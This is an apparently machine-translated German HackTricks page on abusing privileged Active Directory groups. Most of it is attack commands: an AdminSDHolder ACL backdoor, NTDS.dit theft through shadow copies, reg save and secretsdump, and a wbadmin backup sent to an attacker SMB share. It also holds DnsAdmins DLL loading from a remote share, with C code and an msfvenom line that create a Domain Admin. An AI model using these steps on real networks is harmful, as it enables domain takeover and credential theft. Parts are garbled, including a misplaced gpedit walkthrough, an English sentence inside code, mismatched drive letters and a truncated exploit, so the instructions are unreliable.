# Privilegierte Gruppen

<details>

<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks als PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>

## Bekannte Gruppen mit Administrationsrechten

* **Administratoren**
* **Domänen-Administratoren**
* **Unternehmens-Administratoren**

## Account-Betreiber

Diese Gruppe ist berechtigt, Konten und Gruppen zu erstellen, die keine Administratoren in der Domäne sind. Darüber hinaus ermöglicht es die lokale Anmeldung am Domänencontroller (DC).

Um die Mitglieder dieser Gruppe zu identifizieren, wird der folgende Befehl ausgeführt:
```powershell
Get-NetGroupMember -Identity "Account Operators" -Recurse
```
Das Hinzufügen neuer Benutzer ist erlaubt, ebenso wie die lokale Anmeldung bei DC01.

## AdminSDHolder-Gruppe

Die Access Control List (ACL) der **AdminSDHolder**-Gruppe ist entscheidend, da sie Berechtigungen für alle "geschützten Gruppen" in Active Directory festlegt, einschließlich hochprivilegierter Gruppen. Dieser Mechanismus gewährleistet die Sicherheit dieser Gruppen, indem unbefugte Änderungen verhindert werden.

Ein Angreifer könnte dies ausnutzen, indem er die ACL der **AdminSDHolder**-Gruppe ändert und einem Standardbenutzer volle Berechtigungen gewährt. Dadurch hätte dieser Benutzer effektive Kontrolle über alle geschützten Gruppen. Wenn die Berechtigungen dieses Benutzers geändert oder entfernt werden, werden sie aufgrund des Systemdesigns innerhalb einer Stunde automatisch wiederhergestellt.

Befehle zur Überprüfung der Mitglieder und zur Änderung der Berechtigungen sind:
```powershell
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```
Ein Skript steht zur Verfügung, um den Wiederherstellungsprozess zu beschleunigen: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).

Weitere Details finden Sie unter [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence).

## AD-Papierkorb

Die Mitgliedschaft in dieser Gruppe ermöglicht das Lesen gelöschter Active Directory-Objekte, was sensible Informationen offenlegen kann:
```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
### Zugriff auf den Domänencontroller

Der Zugriff auf Dateien auf dem DC ist eingeschränkt, es sei denn, der Benutzer gehört zur Gruppe "Server Operators", was das Zugriffsniveau ändert.

### Privilege Escalation

Mit `PsService` oder `sc` von Sysinternals kann man Service-Berechtigungen inspizieren und ändern. Die Gruppe "Server Operators" hat beispielsweise volle Kontrolle über bestimmte Dienste, was die Ausführung beliebiger Befehle und Privilege Escalation ermöglicht:
```cmd
C:\> .\PsService.exe security AppReadiness
```
Dieser Befehl zeigt, dass `Server Operators` vollen Zugriff haben und somit die Manipulation von Diensten für erhöhte Privilegien ermöglichen.

## Backup-Betreiber

Die Mitgliedschaft in der Gruppe `Backup-Betreiber` gewährt Zugriff auf das Dateisystem von `DC01` aufgrund der `SeBackup`- und `SeRestore`-Privilegien. Diese Privilegien ermöglichen das Durchsuchen von Ordnern, das Auflisten von Dateien und das Kopieren von Dateien, auch ohne explizite Berechtigungen, unter Verwendung des Flags `FILE_FLAG_BACKUP_SEMANTICS`. Für diesen Vorgang sind spezifische Skripte erforderlich.

Um die Mitglieder der Gruppe aufzulisten, führen Sie aus:
```powershell
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```
### Lokaler Angriff

Um diese Berechtigungen lokal zu nutzen, werden die folgenden Schritte durchgeführt:

1. Importieren der erforderlichen Bibliotheken:
```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```
2. Aktivieren und überprüfen Sie `SeBackupPrivilege`:

```plaintext
Um `SeBackupPrivilege` zu aktivieren, führen Sie die folgenden Schritte aus:

1. Öffnen Sie die Gruppenrichtlinienverwaltung (`gpedit.msc`).
2. Navigieren Sie zu "Computerkonfiguration" > "Windows-Einstellungen" > "Sicherheitseinstellungen" > "Lokale Richtlinien" > "Zuweisen von Benutzerrechten".
3. Doppelklicken Sie auf "Sicherungsvorgänge durchführen".
4. Klicken Sie auf "Hinzufügen".
5. Geben Sie den Benutzernamen oder die Gruppe ein, der/die das `SeBackupPrivilege` erhalten soll.
6. Klicken Sie auf "OK" und schließen Sie die Gruppenrichtlinienverwaltung.

Um zu überprüfen, ob `SeBackupPrivilege` aktiviert ist, können Sie das Tool `whoami` verwenden. Führen Sie den folgenden Befehl aus:

```
whoami /priv
```

Suchen Sie in der Ausgabe nach `SeBackupPrivilege`. Wenn es aufgelistet ist, ist es aktiviert.
```
```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```
3. Auf Dateien in eingeschränkten Verzeichnissen zugreifen und kopieren, zum Beispiel:
```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```
### AD-Angriff

Direkter Zugriff auf das Dateisystem des Domain Controllers ermöglicht den Diebstahl der `NTDS.dit`-Datenbank, die alle NTLM-Hashes für Domänenbenutzer und -computer enthält.

#### Verwendung von diskshadow.exe

1. Erstellen Sie eine Schattenkopie des Laufwerks `C`:
```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```
2. Kopieren Sie `NTDS.dit` aus dem Schattenkopie:
```cmd
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
Alternativ können Sie `robocopy` zum Kopieren von Dateien verwenden:
```cmd
robocopy /B F:\Windows\NTDS .\ntds ntds.dit
```
3. Extrahiere `SYSTEM` und `SAM` zur Hash-Wiederherstellung:
```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
4. Holen Sie alle Hashes aus `NTDS.dit` ab:
```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
#### Verwendung von wbadmin.exe

1. Richten Sie das NTFS-Dateisystem für den SMB-Server auf dem Angreiferrechner ein und speichern Sie die SMB-Anmeldeinformationen im Zwischenspeicher des Zielrechners.
2. Verwenden Sie `wbadmin.exe` für die Systemsicherung und die Extraktion von `NTDS.dit`:
```cmd
net use X: \\<Angriffs-IP>\Freigabename /user:smbuser Passwort
echo "Y" | wbadmin start backup -backuptarget:\\<Angriffs-IP>\Freigabename -include:c:\windows\ntds
wbadmin get versions
echo "Y" | wbadmin start recovery -version:<Datum-Zeit> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```

Für eine praktische Demonstration siehe [DEMO-VIDEO MIT IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).

## DnsAdmins

Mitglieder der Gruppe **DnsAdmins** können ihre Privilegien ausnutzen, um eine beliebige DLL mit SYSTEM-Privilegien auf einem DNS-Server zu laden, der häufig auf Domänencontrollern gehostet wird. Diese Fähigkeit bietet erhebliches Ausbeutungspotenzial.

Um die Mitglieder der Gruppe DnsAdmins aufzulisten, verwenden Sie:
```powershell
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```
### Ausführung beliebiger DLL-Dateien

Mit Befehlen wie den folgenden können Mitglieder den DNS-Server dazu bringen, eine beliebige DLL-Datei (entweder lokal oder von einem Remote-Share) zu laden:
```powershell
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```
Das Neustarten des DNS-Dienstes (was möglicherweise zusätzliche Berechtigungen erfordert) ist erforderlich, damit die DLL geladen werden kann:
```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```
Für weitere Details zu diesem Angriffsvektor siehe ired.team.

#### Mimilib.dll
Es ist auch möglich, mimilib.dll für die Ausführung von Befehlen zu verwenden, indem sie modifiziert wird, um spezifische Befehle oder Reverse Shells auszuführen. Weitere Informationen finden Sie in diesem [Beitrag](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html).

### WPAD-Eintrag für MitM
DnsAdmins können DNS-Einträge manipulieren, um Man-in-the-Middle (MitM)-Angriffe durchzuführen, indem sie nach Deaktivierung der globalen Abfrageblockierungsliste einen WPAD-Eintrag erstellen. Tools wie Responder oder Inveigh können zum Spoofing und zur Erfassung des Netzwerkverkehrs verwendet werden.

### Ereignisprotokoll-Leser
Mitglieder können auf Ereignisprotokolle zugreifen und potenziell sensible Informationen wie Klartext-Passwörter oder Details zur Befehlsausführung finden:
```powershell
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```
## Exchange Windows-Berechtigungen
Diese Gruppe kann DACLs (Discretionary Access Control Lists) am Domänenobjekt ändern und potenziell DCSync-Berechtigungen gewähren. Techniken zur Privileg-Eskalation, die diese Gruppe ausnutzen, werden im Exchange-AD-Privesc GitHub-Repository detailliert beschrieben.
```powershell
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```
## Hyper-V-Administratoren
Hyper-V-Administratoren haben vollen Zugriff auf Hyper-V, was ausgenutzt werden kann, um die Kontrolle über virtualisierte Domänencontroller zu erlangen. Dies beinhaltet das Klonen von aktiven DCs und das Extrahieren von NTLM-Hashes aus der NTDS.dit-Datei.

### Beispiel für Ausnutzung
Der Mozilla Maintenance Service von Firefox kann von Hyper-V-Administratoren ausgenutzt werden, um Befehle als SYSTEM auszuführen. Dies beinhaltet das Erstellen eines Hardlinks zu einer geschützten SYSTEM-Datei und das Ersetzen dieser Datei durch eine bösartige ausführbare Datei:
```bash
# Take ownership and start the service
takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
sc.exe start MozillaMaintenance
```
Hinweis: Die Ausnutzung von Hardlinks wurde in aktuellen Windows-Updates abgeschwächt.

## Organisation Management

In Umgebungen, in denen **Microsoft Exchange** eingesetzt wird, verfügt eine spezielle Gruppe namens **Organization Management** über erhebliche Fähigkeiten. Diese Gruppe ist berechtigt, **auf die Postfächer aller Domänenbenutzer zuzugreifen** und hat **volle Kontrolle über die Organisationseinheit (OU) 'Microsoft Exchange Security Groups'**. Diese Kontrolle umfasst die Gruppe **`Exchange Windows Permissions`**, die für Privileg-Eskalation ausgenutzt werden kann.

### Ausnutzung von Privilegien und Befehle

#### Druckoperatoren
Mitglieder der Gruppe **Druckoperatoren** verfügen über mehrere Privilegien, darunter das Privileg **`SeLoadDriverPrivilege`**, das es ihnen ermöglicht, sich lokal bei einem Domänencontroller anzumelden, ihn herunterzufahren und Drucker zu verwalten. Um diese Privilegien auszunutzen, insbesondere wenn **`SeLoadDriverPrivilege`** unter einem nicht erhöhten Kontext nicht sichtbar ist, ist es erforderlich, die Benutzerkontensteuerung (UAC) zu umgehen.

Um die Mitglieder dieser Gruppe aufzulisten, wird der folgende PowerShell-Befehl verwendet:
```powershell
Get-NetGroupMember -Identity "Print Operators" -Recurse
```
Für detailliertere Exploitationstechniken im Zusammenhang mit **`SeLoadDriverPrivilege`** sollte man spezifische Sicherheitsressourcen konsultieren.

#### Remote Desktop-Benutzer
Die Mitglieder dieser Gruppe haben Zugriff auf PCs über das Remote Desktop Protocol (RDP). Um diese Mitglieder aufzulisten, stehen PowerShell-Befehle zur Verfügung:
```powershell
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```
Weitere Einblicke in die Ausnutzung von RDP finden Sie in speziellen Pentesting-Ressourcen.

#### Remote-Verwaltungsbenutzer
Mitglieder können auf PCs über die **Windows Remote-Verwaltung (WinRM)** zugreifen. Die Aufzählung dieser Mitglieder erfolgt über:
```powershell
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```
Für Exploitation-Techniken im Zusammenhang mit **WinRM** sollte spezifische Dokumentation konsultiert werden.

#### Server Operators
Diese Gruppe hat Berechtigungen, um verschiedene Konfigurationen auf Domain Controllern durchzuführen, einschließlich Backup- und Wiederherstellungsrechten, Ändern der Systemzeit und Herunterfahren des Systems. Um die Mitglieder aufzulisten, wird der folgende Befehl verwendet:
```powershell
Get-NetGroupMember -Identity "Server Operators" -Recurse
```
## Referenzen <a href="#referenzen" id="referenzen"></a>

* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
* [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
* [https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory)
* [https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--](https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--)
* [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
* [http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/](http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)
* [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
* [https://rastamouse.me/2019/01/gpo-abuse-part-1/](https://rastamouse.me/2019/01/gpo-abuse-part-1/)
* [https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
* [https://github.com/tandasat/ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
* [https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
* [https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
* [https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
* [https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html](https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)

<details>

<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks als PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegramm-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>
